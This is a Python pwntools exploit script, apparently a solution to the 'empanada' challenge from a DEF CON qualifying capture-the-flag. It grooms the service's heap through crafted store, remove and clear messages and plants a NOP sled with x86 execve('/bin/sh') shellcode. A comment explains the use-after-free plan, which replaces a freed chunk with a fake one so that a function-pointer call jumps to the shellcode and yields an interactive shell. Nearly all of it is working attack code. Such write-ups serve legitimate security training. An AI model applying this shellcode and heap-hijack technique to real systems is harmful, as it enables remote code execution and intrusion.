
from pwn import *
#p = process('./empanada')
HOST = 'empanada_45e50f0410494ec9cfb90430d2e86287.quals.shallweplayaga.me'
PORT = 47281

p = r = remote(HOST, PORT)
p.level = 'debug'

# type index size
def make_byte(t, i, s):
    tt = (t << 7)
    ii = (i << 5)
    assert (s & 0x1f) == s
    res = (tt | ii | s) & 0xff
    return res

def store(c, chain=0, m_type=0):
    t = make_byte(m_type, chain, len(c)+1)
    p.send(p8(t))
    t = ''
    # t += p8( 0x60 ) # get all
    t += p8( 0x10 ) # store
    if len(c) > (0x1f-1):
      raise "too big"
    t += c
    p.send( t )
    if chain == 0:
      print p.recvuntil('Return:')
      
def rm(i):
    t = make_byte(1, 0, 0x1f)
    p.send(p8(t))
    t = ''
    t += p8( 0x50 ) # rm
    t += p8( i ) 
    t += 'A' * (0x1f - len(t))
    p.send( t )
    print p.recvuntil('Return:')

def getall(*x):
  t = make_byte(1, 0, 0x1f)
  p.send(p8(t))
  t = ''
  t += p8( 0x60 ) # rm
  t += p8( 0x00 ) 
  t += 'A' * (0x1f - len(t))
  p.send( t )

def clear(*x):
  t = make_byte(1, 0, 0x1f)
  p.send(p8(t))
  t = ''
  t += p8( 0xfe ) # rm
  t += p8( 0x00 ) 
  t += 'A' * (0x1f - len(t))
  p.send( t )
  
def getmsg(i,chain=0):
    t = make_byte(1, chain, 4)
    p.send(p8(t))
    t = ''
    t += p8( 0x30 ) # getmsg
    print 'get msg', `i`
    t += p8( i ) 
    t += p8( i ) 
    t += p8( i ) 
    t += p8( i ) 
    p.send( t )

def hsum(i,ret=''):
    t = make_byte(1, 0, 4)
    p.send(p8(t))
    t = ''
    t += p8( 0x20 ) # hsum
    print 'get msg', `i`
    t += p8( i ) 
    t += p8( i ) 
    t += p8( i ) 
    t += p8( i ) 
    p.send( t )

import time
time.sleep(1)

"""
idea:
1.  store chunk -> m type !0 #chunkA
2.  store chunk -> m type !0 #chunkB
3.  store chunk -> m type 0  #chunkC
4.  clear invalid # chunkC freed
5.  getAll/getMsg to allocate 0x30 and replace chunkC
6.  clear invalid -> triggers function pointer in fake chunkC



"""
#store("A"*(0x1f-2), 1)
#store("A"*(0x1f-2), 0, 1)

#chain to get getmsg up to 0x30

store("d", 1, 1)
store("d2", 0, 1) #hole (0x31337048) for commands to use once this is freed 
store("d3", 0, 1) #hole for commands to use once this is freed 

shellcode = "\x31\xc0\xf7\xe2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xcc"

store("\x90"*(0x1e-len(shellcode)) + shellcode, 1, 1)         # 0x31337048
store("B"*(0x30-0x1e-3-6-4) + "\x75\x71\x33\x31" + "123456", 0, 1)  #0x313370c0

store("C"*8, 1, 1) #0x31337084
store("X"*(8), 1, 0) #this gets freed (0x313370fc)
store("Y"*(8), 1, 0) #this gets freed (0x31337138)

rm(0) #create hole for the next set of commands -> frees d2/d3

clear(0) #frees X,Y, chunks -> reuses 0x31337174, frees: 0x313370fc, 0x31337138

getmsg(1) #getmsg resues a chunk
clear(0) # this triggers the function pointer call



#while(1):
#    print p.recv(1)
r.interactive()
